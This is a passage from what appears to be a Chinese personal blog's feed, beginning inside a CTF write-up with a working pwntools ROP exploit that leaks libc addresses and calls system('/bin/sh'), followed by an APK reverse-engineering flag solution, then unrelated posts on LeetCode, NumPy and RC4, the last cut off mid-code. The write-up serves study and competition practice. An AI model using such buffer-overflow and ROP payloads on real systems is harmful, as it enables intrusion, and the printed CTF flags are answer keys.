string">"__free_hook:"</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>__free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>    success<span class="token punctuation">(</span><span class="token string">"_IO_2_1_stdout_:"</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>_IO_2_1_stdout_<span class="token punctuation">)</span><span class="token punctuation">)</span>    success<span class="token punctuation">(</span><span class="token string">"system_addr:"</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    success<span class="token punctuation">(</span><span class="token string">"bin_sh_addr:"</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>atoi_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span>printf_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>printf_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000400863</span>pop_rsi_r15_ret <span class="token operator">=</span> <span class="token number">0x0000000000400861</span>rodata <span class="token operator">=</span> <span class="token number">0x00000000004008CD</span>main_addr <span class="token operator">=</span> <span class="token number">0x0000000000400713</span>ret <span class="token operator">=</span> <span class="token number">0x000000000040028c</span>ru<span class="token punctuation">(</span><span class="token string">'length :'</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span><span class="token string">"-1"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x138</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rodata<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_r15_ret<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>printf_got<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>printf_plt<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">"data!"</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>printf_addr <span class="token operator">=</span> r7f<span class="token punctuation">(</span><span class="token punctuation">)</span>leak_libc<span class="token punctuation">(</span>printf_addr<span class="token punctuation">,</span><span class="token string">'printf'</span><span class="token punctuation">)</span><span class="token comment"># pause()</span>ru<span class="token punctuation">(</span><span class="token string">"read your length :"</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span><span class="token string">"-1"</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x138</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">"data!"</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>sl<span class="token punctuation">(</span><span class="token string">'cat flag'</span><span class="token punctuation">)</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="逆向1"><a href="#逆向1" class="headerlink" title="逆向1"></a>逆向1</h2><pre class="line-numbers language-none"><code class="language-none">apk逆向，只有java层，看逻辑：生成一串密文，然后将输入按照key进行加密，然后和密文进行对比。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/9b6f20b3780e422db6fb72fdc6450d6a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmd5bGlu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"></p><p>对输入的加密</p><p>这里找到密文，然后手动异或得到对照字符串</p><p><img src="https://img-blog.csdnimg.cn/6a80e478655e4a01b85297b50c4a3f28.png" alt="请添加图片描述"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">这里可以直接转换出KEY逆向思路很简单key<span class="token operator">=</span><span class="token string">"aptxcony"</span>key<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>cipher<span class="token operator">=</span><span class="token string">"f`vgCvkXknxfznQv|gz|0&#125;c|G~bh&#123;&#123;x|CVVFGX"</span>tmp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>flag<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>num<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">:</span>tmp<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>tmp<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0x7f</span>tmp<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0x7f</span>tmp<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0x7f</span><span class="token keyword">print</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token operator">^</span>tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>flag<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">97</span><span class="token operator">-</span><span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>flag<span class="token punctuation">.</span>append<span class="token punctuation">(</span>tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'&#123;'</span><span class="token punctuation">,</span><span class="token string">'&#125;'</span><span class="token punctuation">,</span><span class="token string">'_'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token keyword">if</span> flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>islower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token keyword">else</span><span class="token punctuation">:</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>最后拿到字符串这里把cr后面的下划线改成y就可以了flag<span class="token punctuation">&#123;</span>ez_cr_pto_algorithm_reverse_hah     <span class="token comment">#flag&#123;ez_crypto_algorithm_reverse_haha&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="WEB1"><a href="#WEB1" class="headerlink" title="WEB1"></a>WEB1</h2><p><img src="https://img-blog.csdnimg.cn/a5800cee45a4475d92bd9dfa77369fe6.png" alt="请添加图片描述"></p><p>拿到flag</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>接雨水算法</title>
      <link href="/2021/10/22/jie-yu-shui-suan-fa/"/>
      <url>/2021/10/22/jie-yu-shui-suan-fa/</url>
      
        <content type="html"><![CDATA[<h4 id="42-接雨水"><a href="#42-接雨水" class="headerlink" title="42. 接雨水"></a><a href="https://leetcode-cn.com/problems/trapping-rain-water/">42. 接雨水</a></h4><p>给定 <code>n</code> 个非负整数表示每个宽度为 <code>1</code> 的柱子的高度图，计算按此排列的柱子，下雨之后能接多少雨水。</p><p>比如</p><pre class="line-numbers language-none"><code class="language-none">输入：height &#x3D; [0,1,0,2,1,0,1,3,2,1,2,1]输出：6解释：上面是由数组 [0,1,0,2,1,0,1,3,2,1,2,1] 表示的高度图，在这种情况下，可以接 6 个单位的雨水（蓝色部分表示雨水）。 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="普通算法"><a href="#普通算法" class="headerlink" title="普通算法"></a>普通算法</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">height <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span>left_M<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>right_M<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token builtin">len</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token builtin">sum</span><span class="token operator">=</span><span class="token number">0</span><span class="token comment">#获取左边的最大值</span>left_max<span class="token operator">=</span><span class="token number">0</span><span class="token comment">#获取右边的最大值</span>right_max<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> i<span class="token punctuation">,</span>j <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>height<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">></span>left_max<span class="token punctuation">)</span><span class="token punctuation">:</span>        left_max<span class="token operator">=</span>height<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    left_M<span class="token punctuation">.</span>append<span class="token punctuation">(</span>left_max<span class="token punctuation">)</span><span class="token comment">#print(left_M)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>right_max<span class="token operator">&lt;</span>height<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        right_max<span class="token operator">=</span>height<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    right_M<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>right_max<span class="token comment">#print(right_M)</span><span class="token keyword">for</span> h<span class="token punctuation">,</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span><span class="token builtin">zip</span><span class="token punctuation">(</span>left_M<span class="token punctuation">,</span>right_M<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    temp<span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>temp<span class="token operator">-</span>height<span class="token punctuation">[</span>h<span class="token punctuation">]</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">sum</span><span class="token operator">+=</span>temp<span class="token operator">-</span>height<span class="token punctuation">[</span>h<span class="token punctuation">]</span><span class="token comment">#print(sum)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="利用栈"><a href="#利用栈" class="headerlink" title="利用栈"></a>利用栈</h4><blockquote><pre class="line-numbers language-df" data-language="df"><code class="language-df">思想: 从左向右遍历 如果遍历过程中的元素大于栈的首元素,弹出栈顶元素 并计算相应的长度和高度累加即可.注意求长度的时候是 :当前元素 与(进循环)栈中此元素的上一个元素之差 即i-left -1  高度则是 当前元素与 栈中(pop一次了)顶元素中的最小值再减去 一开始pop出元素的高度 即低洼<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class Solution &#123;public:    int trap(vector&lt;int&gt;&amp; height) &#123;            int sum&#x3D;0;    stack&lt;int&gt;stk;    int n &#x3D; height.size();    for(int i&#x3D;0;i&lt;height.size();i++)&#123;        while(!stk.empty() &amp;&amp;height[i]&gt;height[stk.top()])&#123;            int top&#x3D; stk.top();            stk.pop();            if(stk.empty())&#123;                break;            &#125;            int left&#x3D; stk.top();            int width&#x3D; i - left-1;            int height1&#x3D; min(height[left],height[i])-height[top];            sum+&#x3D; width*height1;    &#125;    stk.push(i);    &#125;  return sum;    &#125;  &#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenCv学习</title>
      <link href="/2021/10/09/opencv-xue-xi/"/>
      <url>/2021/10/09/opencv-xue-xi/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote><p>记录一下Opencv的学习</p></blockquote><h3 id="OpenCv介绍"><a href="#OpenCv介绍" class="headerlink" title="OpenCv介绍"></a>OpenCv介绍</h3><pre class="line-numbers language-none"><code class="language-none">简单来说Opencv提供了上百种计算机视觉,机器学习,图像处理等相关算法.具体的可以百度一下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Opencv使用"><a href="#Opencv使用" class="headerlink" title="Opencv使用"></a>Opencv使用</h3><h4 id="首先来看Numpy库的使用"><a href="#首先来看Numpy库的使用" class="headerlink" title="首先来看Numpy库的使用"></a>首先来看Numpy库的使用</h4><pre class="line-numbers language-none"><code class="language-none">#安装 numpy是Opencv的一个依赖库,所以我们安装了Opencv库之后,Numpy就安装好了pip install opencv-python<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="array类型"><a href="#array类型" class="headerlink" title="array类型"></a>array类型</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token comment">#创建数组</span>array<span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#print(array)</span><span class="token comment">#取最大最小值</span><span class="token builtin">min</span><span class="token operator">=</span> array<span class="token punctuation">.</span><span class="token builtin">max</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token builtin">max</span><span class="token operator">=</span> array<span class="token punctuation">.</span><span class="token builtin">min</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#取平均值</span>average<span class="token operator">=</span> array<span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#print(average)</span><span class="token comment">#还可以进行加减乘除 取余运算</span><span class="token triple-quoted-string string">''''''</span><span class="token string">'此处省略'</span><span class="token triple-quoted-string string">''''''</span>'<span class="token comment">#获取数组中元素值最大的索引</span>array<span class="token punctuation">.</span>argmax<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token comment">#创建二维数组</span>array<span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#查看数组中的元素个数</span><span class="token keyword">print</span><span class="token punctuation">(</span>array<span class="token punctuation">.</span>size<span class="token punctuation">)</span><span class="token comment">#9</span><span class="token comment">#查看数组维度  几行几列</span>shape<span class="token operator">=</span> array<span class="token punctuation">.</span>shape<span class="token comment">#(3, 3)</span><span class="token comment">#将(3,3)的数组转换为一行 表示</span>temp<span class="token operator">=</span> array<span class="token punctuation">.</span>flatten<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#print(temp)</span><span class="token comment">#[0 1 2 3 4 4 5 2 1]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>numpy 创建特殊类别的array 类型方法</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#生成一个2行5列的矩阵</span>array<span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span><span class="token comment">#[[0. 0. 0. 0. 0.]</span><span class="token comment"># [0. 0. 0. 0. 0.]]</span><span class="token comment">#还有第三个参数默认是 dtype, numpy.float64</span><span class="token comment">#可以变成</span>array1<span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>dtype<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>array1<span class="token punctuation">)</span><span class="token comment">#[[0 0 0 0 0]</span><span class="token comment"># [0 0 0 0 0]</span><span class="token comment"># [0 0 0 0 0]]</span><span class="token comment">#从0到10 步长为1 生成</span>array<span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span><span class="token comment">#[0 1 2 3 4 5 6 7 8 9]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="numpy计算"><a href="#numpy计算" class="headerlink" title="numpy计算"></a>numpy计算</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#取绝对值</span><span class="token keyword">print</span><span class="token punctuation">(</span>np<span class="token punctuation">.</span><span class="token builtin">abs</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#三角函数 以正弦函数为例</span>np<span class="token punctuation">.</span>sin<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#e的几次方</span>np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#求平方</span>np<span class="token punctuation">.</span>power<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#求平均值</span>np<span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#开方</span>np<span class="token punctuation">.</span>sqrt<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#求和</span>np<span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#求标准差</span>np<span class="token punctuation">.</span>std<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#求点积</span><span class="token keyword">print</span><span class="token punctuation">(</span>np<span class="token punctuation">.</span>dot<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#14</span><span class="token comment">#这里注意一点就是对于符合叉乘格式的矩阵,自动进行叉乘</span><span class="token comment">#比如</span>array1<span class="token operator">=</span>np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>np<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>array1<span class="token punctuation">,</span>array1<span class="token punctuation">.</span>T<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#[[ 5 13]</span><span class="token comment"># [13 34]]</span><span class="token comment">#求逆矩阵</span>inv<span class="token punctuation">(</span>array<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> python-AI基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RC4加密及逆向对应题目</title>
      <link href="/2021/10/09/rc4-jia-mi-ji-ni-xiang-dui-ying-ti-mu/"/>
      <url>/2021/10/09/rc4-jia-mi-ji-ni-xiang-dui-ying-ti-mu/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote><p>学习了RC4加密算法,做一下记录顺便拿一个题目来说</p></blockquote><blockquote><h3 id="RC4加密算法分为两部分-初始化KAS和伪随机子密钥生成PRGA"><a href="#RC4加密算法分为两部分-初始化KAS和伪随机子密钥生成PRGA" class="headerlink" title="RC4加密算法分为两部分,初始化KAS和伪随机子密钥生成PRGA"></a>RC4加密算法分为两部分,初始化KAS和伪随机子密钥生成PRGA</h3></blockquote><p>我的理解就是:首先进行初始化,然后就是生成随机数</p><p>第一步初始化:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">对S的初始化<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>i<span class="token comment">#对K初始化 密钥长度可变这里以256来说</span>用密钥的<span class="token builtin">ascii</span> 来遍历K K<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span> key<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token comment">#key 是密钥 </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第二步:生成置换S表 就是将S表打乱</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">i<span class="token operator">=</span>k<span class="token operator">=</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">)</span>    s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>i    j<span class="token operator">=</span><span class="token punctuation">(</span>j<span class="token operator">+</span>s<span 